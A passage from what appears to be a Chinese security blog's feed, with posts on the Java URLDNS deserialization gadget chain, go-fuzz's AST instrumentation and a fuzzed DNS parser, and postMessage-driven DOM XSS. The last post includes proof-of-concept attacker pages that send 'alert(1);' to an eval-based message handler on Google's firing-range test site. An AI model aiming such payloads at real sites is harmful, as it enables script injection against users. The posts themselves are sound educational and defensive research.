  HashMap.readObject() *       HashMap.putVal() *         HashMap.hash() *           URL.hashCode() *</code></pre><p>在刚开始会new  HashMap()，</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-3.png" alt="image-20220319171527663"></p><p>接下来会调用会调用putVal方法，putVal作用在于HashMap放入键值，这里调用了hash方法来处理key</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-4.png" alt="image-20220319172033597"></p><p>值得关注key.hashCode()方法，</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-5.png" alt="image-20220319172118524"></p><p>当hashcode==-1时会执行hashCode = handler.hashCode(this);（默认值为-1所以这里不用太在意）</p><p>这里调用getHostAddress</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-6.png" alt="image-20220319172245170"></p><p>他会进行dns的查询。</p><p>然后就是一些细节：</p><p>在Hashmap的readObject</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-7.png" alt="image-20220319172426593"></p><p>key是从readObject得到的，说明key应该在writeObject被写入了。</p><p>WriteObject最后会调用到internalWriteEntries(s)。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-8.png" alt="image-20220319172535442"></p><p>从中可看出，key和value都来自table，即HashMap中table的值。</p><p>要修改table一般会调用HashMap的put方法，从而调用putVal，这样就会造成dns请求，会和目标机器的混淆。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-9.png" alt="img"></p><p>这里ysoserial 继承抽象类SilentURLStreamHandler类，重写了openConnection和getHostAddress，</p><p>可以直接返回NULL，不会有后续的操作，从而不会dns请求。</p><p>知道这些我们也可以通过反射来将poc再写一遍，网上大佬们写的很完善了，俺就不班门弄斧了。</p><p>参考：</p><p><a href="https://www.yuque.com/pmiaowu/gpy1q8/ygthda">https://www.yuque.com/pmiaowu/gpy1q8/ygthda</a></p><p><a href="https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc</a></p><p><a href="https://xz.aliyun.com/t/7157?page=5">https://xz.aliyun.com/t/7157?page=5</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;URLDNS调试那些小事&quot;&gt;&lt;a href=&quot;#URLDNS调试那些小事&quot; class=&quot;headerlink&quot; title=&quot;URLDNS调试那些小事&quot;&gt;&lt;/a&gt;URLDNS调试那些小事&lt;/h1&gt;&lt;p&gt;近期在看javaweb相关的知识，ysoserial作为反序</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>云原生项目Fuzz特点及思考</title>
    <link href="https://rainsec.cn/post/Go-Fuzz%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83.html"/>
    <id>https://rainsec.cn/post/Go-Fuzz%E8%A7%A3%E6%9E%90%E4%B8%8E%E6%80%9D%E8%80%83.html</id>
    <published>2022-03-25T10:48:45.000Z</published>
    <updated>2022-07-22T11:57:37.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go-fuzz的解析与思考"><a href="#Go-fuzz的解析与思考" class="headerlink" title="Go-fuzz的解析与思考"></a>Go-fuzz的解析与思考</h1><h2 id="go-fuzz"><a href="#go-fuzz" class="headerlink" title="go-fuzz"></a>go-fuzz</h2><blockquote><p>Go-fuzz的原理很多都是基于AFL，这里只分析了一些它独特的地方，收获很多，也希望可以和大家交流，如有分析错误还望交流指正。</p></blockquote><p>​        go-fuzz是google开源的一款go语言fuzz框架，它和AFL很大的一个不同是在于，AFL通常通过对未修改的文件的输入进行操作，而go-fuzz需要你编写一个Fuzz函数，go-fuzz通过不断的调用该函数来进行fuzz，前者通常会为每一个输入创建一个新的进程，后者则是不断的调用Fuzz函数因此不需要经常启动或者重启进程。</p><h2 id="什么是覆盖引导型Fuzz"><a href="#什么是覆盖引导型Fuzz" class="headerlink" title="什么是覆盖引导型Fuzz"></a>什么是覆盖引导型Fuzz</h2><p>​        覆盖引导型Fuzz通过代码覆盖率信息来决定一个突变是否有效，如果代码覆盖率增长就保存该输入并对其进行持续变异，否则就丢弃该变异：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/gofuzz01.jpg" alt="img"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/gofuzz02.jpg" alt="img"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/gofuzz03.jpg" alt="img"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/gofuzz04.jpg" alt="img"></p><h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><h3 id="go-fuzz-build模块"><a href="#go-fuzz-build模块" class="headerlink" title="go-fuzz-build模块"></a>go-fuzz-build模块</h3><p>​        该模块的主要作用在于将需要测试的包信息和测试用例信息打包方便进行测试。</p><ol><li>利用PProf进行性能分析</li><li>加载选中的go语言包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个fuzz材料包</li><li>遍历加载的go语言包里面所有的函数名查找所有的名为Fuzz的函数，同时进行签名认证，但是Fuzz函数的个数应该大于0同时小于等于255</li><li>获取环境变量，大多是和go有关的环境变量.</li><li>加载go语言标准库</li><li>忽略一些标准库中的包和github.com/dvyukov/go-fuzz/go-fuzz-dep这个包，因为没有理由进行fuzz测试，为了避免陷入循环（具体为啥我也不是很清楚）</li><li>在/tmp下创建临时文件夹保存需要使用的tools和包</li><li>接下来就是很高阶的语法树等的建立过程，这个过程中会使用gatherLiterals获取到你提供的初始材料<ol><li>获取到需要fuzz的包的具体信息，进而可以生成go-fuzz的元数据</li><li>将存储信息的cover.exe和sonar.exe已经metadata打包生成zip文件夹</li></ol></li></ol><h3 id="语法树插桩实现"><a href="#语法树插桩实现" class="headerlink" title="语法树插桩实现"></a>语法树插桩实现</h3><p>​        go语言不同于C语言可以as等汇编工具来较为方便的实现编译时插桩（具体可以参考AFL的插桩方式），为了实现go语言的编译时插桩，我们首先要了解go语言整体的编译流程：</p><ol><li>词法与语法分析</li><li>类型检查</li><li>中间代码生成</li><li>机器码生成</li></ol><p>那么其实大致就可以看出比较理想的地方就是词法与语法分析的时候对抽象语法书进行插桩了，同时go标准库也提供了scanner，ast和token等相关库来帮助很好的扫描，解析和创建相关抽象语法树，在整个插桩的过程中其实是把go的包一个个遍历插桩的，然后因为go-fuzz不允许导入main包，其实是因为它在插桩完成之后会自己加入相关的main函数。</p><p>​        在go-fuzz-build中实现了结构体File和结构体Sonar，这两个结构体都实现了自己的Visit()函数用来遍历相关的语法树：</p><pre><code class="go">type File struct {    fset     *token.FileSet    pkg      string    fullName string    astFile  *ast.File    blocks   *[]CoverBlock    info     *types.Info}type Sonar struct {    fset     *token.FileSet    fullName string    pkg      string    blocks   *[]CoverBlock    info     *types.Info}</code></pre><p>在整个的build的过程中也会生成coverBin和sonarBin两个文件分别对应上述两个结构体的语法树遍历函数执行结果。</p><h4 id="File遍历"><a href="#File遍历" class="headerlink" title="File遍历"></a>File遍历</h4><p>​        在生成coverBin的时候使用的是File结构体对应的Visit遍历函数，不过在开始遍历之前会通过自身实现的addImport来实现go-fuzz-dep包相关内容的导入：</p><blockquote><p>file.addImport(“go-fuzz-dep”, fuzzdepPkg, “CoverTab”)</p></blockquote><pre><code class="go">func (f *File) addImport(path, name, anyIdent string) {    newImport := &amp;ast.ImportSpec{        Name: ast.NewIdent(name),        Path: &amp;ast.BasicLit{            Kind:  token.STRING,            Value: fmt.Sprintf("%q", path),        },    }    impDecl := &amp;ast.GenDecl{        Lparen: f.astFile.Name.End(),        Tok:    token.IMPORT,        Specs: []ast.Spec{            newImport,        },        Rparen: f.astFile.Name.End(),    }    // Make the new import the first Decl in the file.    astFile := f.astFile    astFile.Decls = append(astFile.Decls, nil)    copy(astFile.Decls[1:], astFile.Decls[0:])    astFile.Decls[0] = impDecl    astFile.Imports = append(astFile.Imports, newImport)    // Now refer to the package, just in case it ends up unused.    // That is, append to the end of the file the declaration    //    var _ = _cover_atomic_.AddUint32    reference := &amp;ast.GenDecl{        Tok: token.VAR,        Specs: []ast.Spec{            &amp;ast.ValueSpec{                Names: []*ast.Ident{                    ast.NewIdent("_"),                },                Values: []ast.Expr{                    &amp;ast.SelectorExpr{                        X:   ast.NewIdent(name),                        Sel: ast.NewIdent(anyIdent),                    },                },            },        },    }    astFile.Decls = append(astFile.Decls, reference)}</code></pre><p>观察源码其实逻辑也很简单，首先创建了一个基本声明信息节点来将相关的包导入原本的语法树中，同时为了避免导入包但是未使用，所以导入简单的声明语句。导入完成之后使用ast.Walk()来遍历语法树，该函数会调用File结构体对应的Visit函数。</p><pre><code class="go">// 源码太长，只贴部分func (f *File) Visit(node ast.Node) ast.Visitor {    switch n := node.(type) {    case *ast.FuncDecl:        if n.Name.String() == "init" {            // Don't instrument init functions.            // They run regardless of what we do, so it is just noise.            return nil        }    case *ast.GenDecl:        if n.Tok != token.VAR {            return nil // constants and types are not interesting        }    case *ast.BlockStmt: // {}中间的语句        // If it's a switch or select, the body is a list of case clauses; don't tag the block itself.        if len(n.List) &gt; 0 {            switch n.List[0].(type) {            case *ast.CaseClause: // switch                for _, n := range n.List {                    clause := n.(*ast.CaseClause)                    clause.Body = f.addCounters(clause.Pos(), clause.End(), clause.Body, false)                }                return f            case *ast.CommClause: // select                for _, n := range n.List {                    clause := n.(*ast.CommClause)                    clause.Body = f.addCounters(clause.Pos(), clause.End(), clause.Body, false)                }                return f            }        }        n.List = f.addCounters(n.Lbrace, n.Rbrace+1, n.List, true) // +1 to step past closing brace.......}</code></pre><p>可以看出在遍历语法树的过程中对节点的类型进行了判断，然后对{}中间的内容进行一个判断和插桩，具体的插桩函数如下：</p><pre><code class="go">func (f *File) addCounters(pos, blockEnd token.Pos, list []ast.Stmt, extendToClosingBrace bool) []ast.Stmt {    // Special case: make sure we add a counter to an empty block. Can't do this below    // or we will add a counter to an empty statement list after, say, a return statement.    if len(list) == 0 {        return []ast.Stmt{f.newCounter(pos, blockEnd, 0)}    }    // We have a block (statement list), but it may have several basic blocks due to the    // appearance of statements that affect the flow of control.    var newList []ast.Stmt    for {        // Find first statement that affects flow of control (break, continue, if, etc.).        // It will be the last statement of this basic block.        var last int        end := blockEnd        for last = 0; last &lt; len(list); last++ {            end = f.statementBoundary(list[last])            if f.endsBasicSourceBlock(list[last]) {                extendToClosingBrace = false // Block is broken up now.                last++                break            }        }        if extendToClosingBrace {            end = blockEnd        }        if pos != end { // Can have no source to cover if e.g. blocks abut.            newList = append(newList, f.newCounter(pos, end, last)) // 在List里面增加counter计数器        }        newList = append(newList, list[0:last]...)        list = list[last:]        if len(list) == 0 {            break        }        pos = list[0].Pos()    }    return newList}</code></pre><p>假设现在有一个switch的demo</p><pre><code class="go">func main() {    var n = 1    switch n {    case 0:        fmt.Println("this is 0")    case 1:        fmt.Println("this is 1")    }}</code></pre><p>这一步的具体操作就是把每一个case拿出来，然后将case相关的语法树的起始位置和结束位置还有body部分全部传入addCounters，addCounters的逻辑起始也非常简单，如果body为空就直接返回一个Counter的ast.Stmt声明语法树结构，</p><blockquote><p> Counter是作者自定义的一种插桩计数器，这种计数器主要包括两个部分:</p><ol><li>对于每个包的File的结构体都维护了一个*[]CoverBlock，每次增加Counter都会在这个数组里面增加一个CoverBlock里面记录了插桩语法树的位置以及内部是否还包含多少其他声明。</li><li>一个是ast.IncDecStmt节点，这个是newCounter()函数的返回值</li></ol></blockquote><p>如果body不为空就找到所有影响控制流的声明，比如if，switch, break ,goto等都会开启或者中断一个新的控制流，找到边界声明之后判断其是否属于刚才的类型：</p><pre><code class="go">func (f *File) endsBasicSourceBlock(s ast.Stmt) bool {    switch s := s.(type) {    case *ast.BlockStmt:        // Treat blocks like basic blocks to avoid overlapping counters.        return true    case *ast.BranchStmt:        return true    case *ast.ForStmt:        return true    case *ast.IfStmt:        return true    case *ast.LabeledStmt:        return f.endsBasicSourceBlock(s.Stmt)    case *ast.RangeStmt:        return true    case *ast.SwitchStmt:        return true    case *ast.SelectStmt:        return true    case *ast.TypeSwitchStmt:        return true    case *ast.ExprStmt:        // Calls to panic change the flow.        // We really should verify that "panic" is the predefined function,        // but without type checking we can't and the likelihood of it being        // an actual problem is vanishingly small.        if call, ok := s.X.(*ast.CallExpr); ok {            if ident, ok := call.Fun.(*ast.Ident); ok &amp;&amp; ident.Name == "panic" &amp;&amp; len(call.Args) == 1 {                return true            }        }    }    found, _ := hasFuncLiteral(s)    return found}</code></pre><p>其实就是大量的switch语句，如果是的话，就可以将直接边界作为end进行插桩，这一步的意义其实就是在于把{}里面的body不断的分割成一个个可以影响控制流的小块进行分别插桩。其实到这里我们就可以洞悉go-fuzz整个的插桩思想：在语法分析的时候就通过go-fuzz本身所包含的一个包的内容插桩到各个可以影响控制流的语句块中，那么接下来对应的工作就应该是如何对这些进行插桩语句块进行感知，这其实就是Sonar结构体的作用，这是go-fuzz发明的声呐系统。</p><h4 id="Sonar遍历"><a href="#Sonar遍历" class="headerlink" title="Sonar遍历"></a>Sonar遍历</h4><p>​        Sonar结构体同样实现了Visit方法来用于遍历语法树，部分源码如下：</p><pre><code class="go">func (s *Sonar) Visit(n ast.Node) ast.Visitor {switch nn := n.(type) {    case *ast.BinaryExpr:        break......case *ast.SwitchStmt:        if nn.Tag == nil || nn.Body == nil {            return s // recurse        }        // Replace:        //    switch a := foo(); bar(a) {        //    case x: ...        //    case y: ...        //    }        // with:        //    switch {        //    default:        //        a := foo()        //        __tmp := bar(a)        //        switch {        //        case __tmp == x: ...        //        case __tmp == y: ...        //        }        //    }        // The == comparisons will be instrumented later when we recurse.        sw := new(ast.SwitchStmt)        *sw = *nn        var stmts []ast.Stmt        if sw.Init != nil {            stmts = append(stmts, sw.Init)            sw.Init = nil        }        const tmpvar = "__go_fuzz_tmp"        tmp := ast.NewIdent(tmpvar)        typ := s.info.Types[sw.Tag]        s.info.Types[tmp] = typ        stmts = append(stmts, &amp;ast.AssignStmt{Lhs: []ast.Expr{tmp}, Tok: token.DEFINE, Rhs: []ast.Expr{sw.Tag}})        stmts = append(stmts, &amp;ast.AssignStmt{Lhs: []ast.Expr{ast.NewIdent("_")}, Tok: token.ASSIGN, Rhs: []ast.Expr{tmp}})        sw.Tag = nil        stmts = append(stmts, sw)        for _, cas1 := range sw.Body.List {            cas := cas1.(*ast.CaseClause)            for i, expr := range cas.List {                tmp := &amp;ast.Ident{Name: tmpvar, NamePos: expr.Pos()}                s.info.Types[tmp] = typ                cas.List[i] = &amp;ast.BinaryExpr{X: tmp, Op: token.EQL, Y: expr}            }        }        nn.Tag = nil        nn.Init = nil        nn.Body = &amp;ast.BlockStmt{List: []ast.Stmt{&amp;ast.CaseClause{Body: stmts}}}        return s // recurse......}</code></pre><p>第一步先根据节点类型找到Switch和For这种结构进行语法树级别的变化，整体的替换逻辑已经在注释里面体现出来了，其实就是类似把switch的条件都提出来放在body内部，然后再body里面建立一个新的switch结构，主要作用可能就是方便识别和统计，对于ast.BinaryExpr结构则是通过自定义的flag进行标注。</p><p>​        整体来看其实就是对包内代码各种语法树节点进行类型检查和过滤，因为一些代码是肯定顺序执行的，然后再需要的地方都插入一些标志，同时在结构体里面记录标志的总量，方便在fuzz执行的时候确定自己的代码位置从而更方便进行统计，具体的可以细看相关代码。</p><h4 id="插桩总结"><a href="#插桩总结" class="headerlink" title="插桩总结"></a>插桩总结</h4><p>​        其实无论是File还是Sonar，个人认为都算是一种插桩，方便对代码覆盖率进行统计，在结束之后都通过createFuzzMain函数进行了封装，这个地方其实也是go-fuzz不支持fuzz的代码包含main函数的具体原因：</p><pre><code class="go">func (c *Context) createFuzzMain() string {    mainPkg := filepath.Join(c.fuzzpkg.PkgPath, "go.fuzz.main")    path := filepath.Join(c.workdir, "gopath", "src", mainPkg)    c.mkdirAll(path)    c.writeFile(filepath.Join(path, "main.go"), c.funcMain())    return mainPkg}</code></pre><p>其实就是将已经写好的main函数模板写入：</p><pre><code class="go">var ainSrc = template.Must(template.New("main").Parse(`package mainimport (    target "{{.Pkg}}"    dep "go-fuzz-dep")func main() {    fns := []func([]byte)int {        {{range .AllFuncs}}            target.{{.}},        {{end}}    }    dep.Main(fns)}`))</code></pre><p>主要作用还是调用包内的Fuzz代码。</p><h3 id="go-fuzz-1"><a href="#go-fuzz-1" class="headerlink" title="go-fuzz"></a>go-fuzz</h3><ol><li>首先通过丢弃触发相同代码路径的的样本来最小化语料库。</li><li>开始改变输入并将数据传递给Fuzz函数，不失败（return 1），然后扩展代码覆盖率的突变会被保留和迭代形成新的样本。</li><li>当程序出现Crash的时候，会保存报告并重新启动程序。</li></ol><p>Fuzz这块的具体原理其实都是参考的AFL，就不多说了，详细也可以参考AFL的Fuzz方式和源码。</p><h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>​        首先简单介绍一下go的Fuzz函数的基本信息：</p><pre><code class="go">func Fuzz(data []byte) int {}</code></pre><p>该函数以int作为返回值，因此当其返回值为0的时候说明Fuzz对于数据不敢影响，可能的原因是测试目标发生了无意义的错误，比如输入内容不合法等，返回值为1说明该数据已经被成功解析，简单来说就是Fuzz输入的data被目标所接受。</p><h3 id="DNS解析器Fuzz"><a href="#DNS解析器Fuzz" class="headerlink" title="DNS解析器Fuzz"></a>DNS解析器Fuzz</h3><p>首先第一步是创建初始语料库，其实就是通过拆解pcap数据包来创造数据：</p><pre><code class="go">package mainimport (    "crypto/rand"    "encoding/hex"    "log"    "os"    "strconv"    "github.com/miekg/pcap")func fatalIfErr(err error) {    if err != nil {        log.Fatal(err)    }}func main() {    handle, err := pcap.OpenOffline(os.Args[1])    fatalIfErr(err)    b := make([]byte, 4)    _, err = rand.Read(b)    fatalIfErr(err)    prefix := hex.EncodeToString(b)    i := 0    for pkt := handle.Next(); pkt != nil; pkt = handle.Next() {        pkt.Decode()        f, err := os.Create("p_" + prefix + "_" + strconv.Itoa(i))        fatalIfErr(err)        _, err = f.Write(pkt.Payload)        fatalIfErr(err)        fatalIfErr(f.Close())        i++    }}</code></pre><p>编写初步的Fuzz函数：</p><pre><code class="go">func Fuzz(rawMsg []byte) int {    msg := &amp;dns.Msg{}    if unpackErr := msg.Unpack(rawMsg); unpackErr != nil {        return 0    }    if _, packErr = msg.Pack(); packErr != nil {        println("failed to pack back a message")        spew.Dump(msg)        panic(packErr)    }    return 1}</code></pre><p>作者在发现了越界：</p><pre><code class="go">func unpackTxt(msg []byte, offset, rdend int) ([]string, int, error) {    var err error    var ss []string    var s string    for offset &lt; rdend &amp;&amp; err == nil {        s, offset, err = unpackTxtString(msg, offset)        if err == nil {            ss = append(ss, s)        }    }    return ss, offset, err}</code></pre><p>但是因为这些越界使得程序经常崩溃，并且Fuzz变的缓慢，于是作者先进行了阶段性的修复工作，主要修复是使用len(msg)而不是使用保留的偏移量：</p><pre><code class="go">func unpackTxt(msg []byte, off0 int) (ss []string, off int, err error) {    off = off0    var s string    for off &lt; len(msg) &amp;&amp; err == nil {        s, off, err = unpackTxtString(msg, off)        if err == nil {            ss = append(ss, s)        }    }    return}</code></pre><p>之后修改好的Fuzz，主要的修改在于增加了ParseDNSPacketSafely，并抛弃了一些无意义的错误，也可能不断测试，不断排除已知的错误:</p><pre><code class="go">func Fuzz(rawMsg []byte) int {    var (        msg, msgOld = &amp;dns.Msg{}, &amp;old.Msg{}        buf, bufOld = make([]byte, 100000), make([]byte, 100000)        res, resOld []byte        unpackErr, unpackErrOld error        packErr, packErrOld     error    )    unpackErr = msg.Unpack(rawMsg)    unpackErrOld = ParseDNSPacketSafely(rawMsg, msgOld)    if unpackErr != nil &amp;&amp; unpackErrOld != nil {        return 0    }    if unpackErr != nil &amp;&amp; unpackErr.Error() == "dns: out of order NSEC block" {        // 97b0a31 - rewrite NSEC bitmap [un]packing to account for out-of-order        return 0    }    if unpackErr != nil &amp;&amp; unpackErr.Error() == "dns: bad rdlength" {        // 3157620 - unpackStructValue: drop rdlen, reslice msg instead        return 0    }    if unpackErr != nil &amp;&amp; unpackErr.Error() == "dns: bad address family" {        // f37c7ea - Reject a bad EDNS0_SUBNET family on unpack (not only on pack)        return 0    }    if unpackErr != nil &amp;&amp; unpackErr.Error() == "dns: bad netmask" {        // 6d5de0a - EDNS0_SUBNET: refactor netmask handling        return 0    }    if unpackErr != nil &amp;&amp; unpackErrOld == nil {        println("new code fails to unpack valid packets")        panic(unpackErr)    }    res, packErr = msg.PackBuffer(buf)    if packErr != nil {        println("failed to pack back a message")        spew.Dump(msg)        panic(packErr)    }    if unpackErrOld == nil {        resOld, packErrOld = msgOld.PackBuffer(bufOld)        if packErrOld == nil &amp;&amp; !bytes.Equal(res, resOld) {            println("new code changed behavior of valid packets:")            println()            println(hex.Dump(res))            println(hex.Dump(resOld))            os.Exit(1)        }    }    return 1}</code></pre><p>Tips：</p><p>​        其实在Fuzz过程中也会遇到一些结构化的问题，毕竟大型项目都会存在大量的复杂结构体难以变异，这时候才为大家提供一个神器go-fuzz-header：</p><blockquote><p><a href="https://adalogics.com/blog/structure-aware-go-fuzzing-complex-types">https://adalogics.com/blog/structure-aware-go-fuzzing-complex-types</a></p></blockquote><h2 id="云原生下的Fuzz思考"><a href="#云原生下的Fuzz思考" class="headerlink" title="云原生下的Fuzz思考"></a>云原生下的Fuzz思考</h2><p>​        云原生的很多新技术其实都是在老技术的交叉上形成的，其实可以类似go项目结构里面的不同的包，对于很多Fuzz目标来言，像以前那样直接从最根本处下手已经不太现实可行，比如容器Fuzz其实很难通过生成大量镜像或者docker client的命令来解决，恰恰相反深入程序内部针对不同函数来编写Fuzz或许更有价值。</p><p>​        但是缺点也很明显，首先必须和代码审计相结合，其次就是由于代码是否用户可达或者crash是否真的引发漏洞效果都有待评估，正如go-fuzz创始人所说：“go-fuzz其实更适合开发者来寻求自己项目中存在的bug”，但是漏洞挖掘技术也是在不断的进步之中，或许可以思考如何把找到的bug发展成漏洞，毕竟对于内存安全的高级语言来说直接谋求可利用漏洞相对困难。</p><p>​        其实在内存漏洞越来越少的现在，这种bug最终演变成漏洞的例子还是有的，就比如linux pkexec提权漏洞，过去几年大家都认为这是一个bug，但是等利用方式被真正发掘，就能变化成为严重的安全问题。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p><a href="https://github.com/dvyukov/go-fuzz">https://github.com/dvyukov/go-fuzz</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Go-fuzz的解析与思考&quot;&gt;&lt;a href=&quot;#Go-fuzz的解析与思考&quot; class=&quot;headerlink&quot; title=&quot;Go-fuzz的解析与思考&quot;&gt;&lt;/a&gt;Go-fuzz的解析与思考&lt;/h1&gt;&lt;h2 id=&quot;go-fuzz&quot;&gt;&lt;a href=&quot;#go</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="https://rainsec.cn/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="Fuzz" scheme="https://rainsec.cn/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>EventListener XSS</title>
    <link href="https://rainsec.cn/post/EventListener%20XSS.html"/>
    <id>https://rainsec.cn/post/EventListener%20XSS.html</id>
    <published>2022-03-25T10:38:45.000Z</published>
    <updated>2022-07-20T11:18:43.904Z</updated>
    
    <content type="html"><![CDATA[<p><strong>EventListener XSS</strong><br>XSS作为混”低保“的最佳漏洞，我们在日常测试中没少碰到，但是<code>DOM</code>型XSS就相对来说不容易被发现了，而本文要介绍的则是更难发现并利用的监听<code>postMessage</code>所导致漏洞。首先从事件监听器开始说起</p><h2 id="事件监听器"><a href="#事件监听器" class="headerlink" title="事件监听器"></a>事件监听器</h2><p>事件监控器可以为指定对象设置一个回调函数，当该对象的指定事件被触发时会被执行：</p><pre><code class="HTML">&lt;table id="outside"&gt;    &lt;tr&gt;&lt;td id="t1"&gt;one&lt;/td&gt;&lt;/tr&gt;    &lt;tr&gt;&lt;td id="t2"&gt;two&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;script&gt;function modifyText() {  var t2 = document.getElementById("t2");  if (t2.firstChild.nodeValue == "three") {    t2.firstChild.nodeValue = "two";  } else {    t2.firstChild.nodeValue = "three";  }}// 为table添加事件监听器var el = document.getElementById("outside");el.addEventListener("click", modifyText, false);&lt;/script&gt;</code></pre><p>以上代码监听了<code>table</code>的<code>click</code>事件，当点击<code>table</code>时会触发<code>modifyText</code>,下面链接列出了所有的事件:</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/Events#event_index">https://developer.mozilla.org/en-US/docs/Web/Events#event_index</a></p><p>这里要说的是<code>postMessage</code>与其对应的事件监听器在不安全配置情况下导致的漏洞，首先看下<code>postMessage</code>的介绍：</p><p>&gt; window.postMessage() 方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 <code>Document.domain</code>设置为相同的值) 时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要<strong>正确的使用</strong>，这种方法就很安全。 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage</a></p><p>它的用法也很简单：</p><pre><code>windows.postMessage(message, targetOrigin, [transfer])</code></pre><ul><li><p>windows是指一个窗口，可以是当前页面的<code>window</code>、<code>window.open</code>返回的窗口对象、<code>iframe</code>的<code>contentWindow</code>属性等</p></li><li><p>message是要发送的消息，可以是字符串，也可以是<code>json</code>格式</p></li><li><p><code>targetOrigin</code>用来指定哪个窗口可以接收到消息，如果为<code>*</code>则表示任意窗口均可收到信息。而如果指定了特定的域名后要求发送消息的窗口其协议、端口、主机地址与指定域名匹配才可发送消息。</p></li></ul><p>发送消息事件可以通过如下方式添加监听事件：</p><pre><code class="JavaScript">window.addEventListener("message", receiveMessage, false);function receiveMessage(event){}</code></pre><p>当发送信息时就会触发<code>receiveMessage</code>。其中<code>event</code>的属性比较重要的有：</p><ul><li><p>data 即<code>postMessage</code>发送的数据</p></li><li><p>origin 发送信息窗口的<code>origin</code></p></li></ul><h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>比起原理，大家肯定对漏洞如何利用更感兴趣。看下面这段代码</p><pre><code class="HTML">&lt;html&gt;  &lt;head&gt;&lt;title&gt;Toxic DOM&lt;/title&gt;&lt;/head&gt;  &lt;body&gt;    &lt;script&gt;      var postMessageHandler = function(msg) {  var content = msg.data;  var msgObj = eval(content);  if (msgObj.isActive) {    document.write("PostMessage arrived!");  }}window.addEventListener('message', postMessageHandler, false);    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;&lt;!-- https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval --&gt;</code></pre><p>很明显可以看出这个页面在监听到<code>postMessage</code>时会调用<code>eval</code>执行发送的信息，那我们就可以构造<code>payload</code>了</p><pre><code class="HTML">&lt;script&gt;                    function pocLink() {                        let win = window.open('https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval');                        let msg = "alert(1);";                        setTimeout(function(){                            win.postMessage(msg, '*');                        }, 5000);                    }&lt;/script&gt; &lt;a href="#" onclick="pocLink();"&gt;PoC link&lt;/a&gt;         </code></pre><p>或者是使用<code>iframe</code></p><pre><code class="HTML">&lt;script&gt;  function pocFrame(win) {               let msg = "alert(1);";    win.postMessage(msg, '*');            }&lt;/script&gt; &lt;iframe src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval" onload="pocFrame(this.contentWindow)"&gt;&lt;/iframe&gt;    </code></pre><p>也就是说我们需要在自己服务器上新建一个页面，用来打开一个新窗口或是加载一个<code>iframe</code>并获取其句柄，用来传递信息。当打开的窗口中存在有<code>message</code>监听，且其触发代码有可利用点时就可以触发漏洞。</p><h2 id="工具检测"><a href="#工具检测" class="headerlink" title="工具检测"></a>工具检测</h2><p>纯手工发现漏洞不可取，<code>Burp</code>的<code>DOM Invader</code>就可以帮助发现此类问题</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image20.1l50zy96mokg.png" alt="img"></p><p>对于<code>https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval</code> 它可以直接检测出漏洞存在并一键生成<code>POC</code></p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image21.n4byv2n2acw.png" alt="img"></p><p>为了了解原理最好可以看看它的代码，但是其源码做了混淆，没办法了解它的原理，所以我们从它的平替<a href="https://github.com/fransr/postMessage-tracker">postMessage-tracker</a>入手进行分析。 其检测结果展示形式为</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image22.6qq7cqyazzg0.png" alt="img"></p><p>平平无奇的一个小框框，相较于<code>DOM Invader</code>的可利用性分析差了许多，不过仅仅了解下原理已然足够了。</p><p>它的目录结构非常简单，首先看下<code>mainfest.json</code></p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image23.1tng48w41gyo.png" alt="img"></p><p><code>run_at</code>表明注入在<code>css</code>之后，<code>dom</code>构建之前。关键代码在<code>content_script.js</code>当中：</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image24.6br43k6e3x00.png" 